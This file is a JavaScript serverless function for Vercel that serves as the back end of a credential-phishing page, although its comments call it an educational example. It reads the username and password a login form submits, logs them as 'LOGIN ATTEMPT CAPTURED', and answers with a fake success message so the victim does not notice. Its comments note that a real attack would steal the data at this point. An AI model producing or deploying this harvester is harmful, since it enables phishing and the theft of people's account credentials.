// File: /api/login.js

// This is a Vercel Serverless Function.
// It will be accessible at your-project-url.vercel.app/api/login

export default function handler(req, res) {
  // We only want to handle POST requests, as the form will send data this way.
  if (req.method === 'POST') {
    // Get the username and password from the request body.
    const { username, password } = req.body;

    // --- THIS IS THE CRITICAL PART ---
    // In a real attack, this is where the data is stolen.
    // We will just print it to the Vercel logs for this educational example.
    console.log('--- LOGIN ATTEMPT CAPTURED ---');
    console.log(`Timestamp: ${new Date().toUTCString()}`);
    console.log(`Username: ${username}`);
    console.log(`Password: ${password}`);
    console.log('------------------------------');
    // ---------------------------------

    // Send a success response back to the frontend.
    // This makes the user think the login was successful.
    res.status(200).json({ success: true, message: 'Login successful! Redirecting...' });
  } else {
    // If the request is not a POST, tell the client this method is not allowed.
    res.setHeader('Allow', ['POST']);
    res.status(405).end(`Method ${req.method} Not Allowed`);
  }
}
